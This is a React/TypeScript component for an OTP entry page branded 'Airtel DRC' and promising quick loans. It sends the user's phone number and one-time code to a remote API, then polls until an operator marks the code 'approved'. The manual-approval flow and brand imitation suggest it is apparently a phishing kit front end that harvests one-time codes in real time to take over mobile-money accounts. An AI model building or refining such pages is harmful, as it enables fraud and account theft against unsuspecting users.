import React, { useState, useRef, useEffect, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import './App.css';

const API_BASE = import.meta.env.VITE_API_BASE_URL ?? '';

const OTP_LENGTH = 4;
const POLL_FAST_MS = 2000;
const POLL_SLOW_MS = 5000;
const POLL_SLOW_AFTER_MS = 60_000;
const TIMER_START = 45;
const PENDING_KEY = 'airtelPendingRequest';

function makeRefId() {
  const ts = Date.now().toString(36).toUpperCase();
  const rand = Math.random().toString(36).slice(2, 6).toUpperCase();
  return `AL-${ts}-${rand}`;
}

function formatPhone(p: string) {
  if (!p) return 'votre téléphone';
  return p.replace(/(\+\d{3})(\d{3})(\d{3})(\d{3})/, '$1 $2 $3 $4');
}

function AirtelOTPVerify() {
  const [otp, setOtp] = useState<string[]>(Array(OTP_LENGTH).fill(''));
  const [timeLeft, setTimeLeft] = useState(TIMER_START);
  const [timerResetKey, setTimerResetKey] = useState(0);
  const [expired, setExpired] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const [waitingForAdmin, setWaitingForAdmin] = useState(false);
  const [refId, setRefId] = useState('');
  const [submittedAt, setSubmittedAt] = useState('');

  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const pollTokenRef = useRef<{ cancelled: boolean } | null>(null);
  const pollTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const hasResumedRef = useRef(false);
  const navigate = useNavigate();

  const phoneNumber = localStorage.getItem('airtelPhone') || '';

  const stopPolling = useCallback(() => {
    if (pollTokenRef.current) pollTokenRef.current.cancelled = true;
    pollTokenRef.current = null;
    if (pollTimerRef.current) {
      clearTimeout(pollTimerRef.current);
      pollTimerRef.current = null;
    }
  }, []);

  useEffect(() => {
    if (!phoneNumber) navigate('/');
  }, [phoneNumber, navigate]);

  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);

  /* ─── Countdown: 45s → 0s, restarts on resend ─── */
  useEffect(() => {
    if (expired) return;

    const id = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(id);
          setExpired(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(id);
  }, [timerResetKey, expired]);

  useEffect(() => stopPolling, [stopPolling]);

  const resetToInput = useCallback(() => {
    stopPolling();
    setIsVerifying(false);
    setWaitingForAdmin(false);
    setSubmittedAt('');
    setRefId('');
    setOtp(Array(OTP_LENGTH).fill(''));
    sessionStorage.removeItem(PENDING_KEY);
    setTimeout(() => inputRefs.current[0]?.focus(), 100);
  }, [stopPolling]);

  const startPolling = useCallback(
    (id: string) => {
      stopPolling();

      const token = { cancelled: false };
      pollTokenRef.current = token;
      const startedAt = Date.now();

      const tick = async () => {
        if (token.cancelled) return;

        try {
          const res = await fetch(
            `${API_BASE}/api/otp-status/${encodeURIComponent(id)}`,
            { cache: 'no-store' },
          );
          const data = await res.json();
          if (token.cancelled) return;

          if (data.status === 'approved') {
            stopPolling();
            sessionStorage.removeItem(PENDING_KEY);
            setTimeout(() => navigate('/airtel-loan-limit'), 300);
            return;
          }

          if (data.status === 'rejected' || data.status === 'expired') {
            resetToInput();
            return;
          }
        } catch {
          /* keep polling */
        }

        if (token.cancelled) return;
        const elapsed = Date.now() - startedAt;
        const delay = elapsed < POLL_SLOW_AFTER_MS ? POLL_FAST_MS : POLL_SLOW_MS;
        pollTimerRef.current = setTimeout(tick, delay);
      };

      pollTimerRef.current = setTimeout(tick, POLL_FAST_MS);
    },
    [navigate, resetToInput, stopPolling],
  );

  useEffect(() => {
    if (hasResumedRef.current) return;
    hasResumedRef.current = true;

    try {
      const raw = sessionStorage.getItem(PENDING_KEY);
      if (!raw) return;
      const saved = JSON.parse(raw);
      if (!saved?.refId) return;

      setRefId(saved.refId);
      setSubmittedAt(saved.submittedAt ?? '');
      setWaitingForAdmin(true);
      setIsVerifying(true);
      startPolling(saved.refId);
    } catch {
      sessionStorage.removeItem(PENDING_KEY);
    }
  }, [startPolling]);

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const next = [...otp];
    next[index] = value.substring(value.length - 1);
    setOtp(next);
    if (value && index < OTP_LENGTH - 1) inputRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
    if (e.key === 'ArrowLeft' && index > 0) inputRefs.current[index - 1]?.focus();
    if (e.key === 'ArrowRight' && index < OTP_LENGTH - 1) inputRefs.current[index + 1]?.focus();
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    const digits = e.clipboardData
      .getData('text')
      .replace(/\D/g, '')
      .slice(0, OTP_LENGTH)
      .split('');
    if (!digits.length) return;
    e.preventDefault();
    const next = Array(OTP_LENGTH).fill('');
    digits.forEach((d, i) => (next[i] = d));
    setOtp(next);
    inputRefs.current[Math.min(digits.length, OTP_LENGTH - 1)]?.focus();
  };

  const handleVerify = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isVerifying) return;

    const otpString = otp.join('');
    if (otpString.length < OTP_LENGTH) return;

    setIsVerifying(true);
    setWaitingForAdmin(false);

    const newRefId = makeRefId();
    const nowIso = new Date().toISOString();

    setRefId(newRefId);
    setSubmittedAt(nowIso);

    try {
      const response = await fetch(`${API_BASE}/api/verify-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phone_number: phoneNumber,
          otp: otpString,
          ref_id: newRefId,
          submitted_at: nowIso,
        }),
      });
      const data = await response.json();

      const finalRef = data.ref_id || newRefId;
      setRefId(finalRef);

      if (data.status === 'approved') {
        sessionStorage.removeItem(PENDING_KEY);
        setTimeout(() => navigate('/airtel-loan-limit'), 300);
        return;
      }

      if (data.status === 'rejected') {
        resetToInput();
        return;
      }

      setWaitingForAdmin(true);
      sessionStorage.setItem(
        PENDING_KEY,
        JSON.stringify({ refId: finalRef, otp: otpString, submittedAt: nowIso }),
      );
      startPolling(finalRef);
    } catch {
      resetToInput();
    }
  };

  const handleResend = async () => {
    if (isVerifying || isResending) return;

    stopPolling();
    sessionStorage.removeItem(PENDING_KEY);
    setTimeLeft(TIMER_START);
    setExpired(false);
    setTimerResetKey((k) => k + 1);
    setOtp(Array(OTP_LENGTH).fill(''));
    setWaitingForAdmin(false);
    setSubmittedAt('');
    setRefId('');
    setIsResending(true);

    try {
      await fetch(`${API_BASE}/api/resend-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone_number: phoneNumber }),
      });
      setTimeout(() => inputRefs.current[0]?.focus(), 100);
    } catch {
      /* silent */
    } finally {
      setIsResending(false);
    }
  };

  return (
    <div className="airtel-container">
      <div className="airtel-header">
        <div className="airtel-hamburger">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="3" y1="12" x2="21" y2="12" />
            <line x1="3" y1="6" x2="21" y2="6" />
            <line x1="3" y1="18" x2="21" y2="18" />
          </svg>
        </div>
        <h1 className="airtel-logo">Airtel DRC</h1>
        <p className="airtel-tagline">Prêts rapides. À tout moment. Partout.</p>
      </div>

      <div className="airtel-card">
        {isVerifying ? (
          <div className="airtel-verifying-state">
            <div className="airtel-big-spinner" />
            <h2 className="airtel-otp-heading">Vérification en cours...</h2>
          </div>
        ) : (
          <>
            <button className="airtel-back-link" onClick={() => navigate('/')}>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <line x1="19" y1="12" x2="5" y2="12" />
                <polyline points="12 19 5 12 12 5" />
              </svg>
              Retour à la connexion
            </button>

            <h2 className="airtel-otp-heading">Vérifiez votre code</h2>
            <p className="airtel-otp-subtext">
              Saisissez le code à {OTP_LENGTH} chiffres envoyé à{' '}
              <strong>{formatPhone(phoneNumber)}</strong>
            </p>

            <form onSubmit={handleVerify}>
              <div className="airtel-input-group">
                <label>Saisir le code OTP</label>
                <div className="airtel-otp-container">
                  {otp.map((digit, index) => (
                    <input
                      key={index}
                      type="tel"
                      inputMode="numeric"
                      autoComplete="one-time-code"
                      maxLength={1}
                      value={digit}
                      ref={(el) => {
                        inputRefs.current[index] = el;
                      }}
                      onChange={(e) => handleChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      onPaste={handlePaste}
                      className="airtel-otp-box"
                    />
                  ))}
                </div>
              </div>

              {/* ─── Timer: seconds only ─── */}
              <div className="airtel-timer" style={expired ? { color: '#DC2626' } : undefined}>
                <svg
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke={expired ? '#DC2626' : '#E53E3E'}
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <circle cx="12" cy="12" r="10" />
                  <polyline points="12 6 12 12 16 14" />
                </svg>
                <span>{timeLeft}s</span>
              </div>

              <button type="submit" className="airtel-verify-btn">
                Vérifier le code
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <line x1="5" y1="12" x2="19" y2="12" />
                  <polyline points="12 5 19 12 12 19" />
                </svg>
              </button>

              <button
                type="button"
                className="airtel-resend-btn"
                onClick={handleResend}
                disabled={isResending}
              >
                {isResending ? (
                  <span className="airtel-btn-loading">
                    <span className="airtel-spinner airtel-spinner-dark" />
                    Envoi en cours...
                  </span>
                ) : (
                  'Renvoyer le code'
                )}
              </button>
            </form>
          </>
        )}
      </div>
    </div>
  );
}

export default AirtelOTPVerify;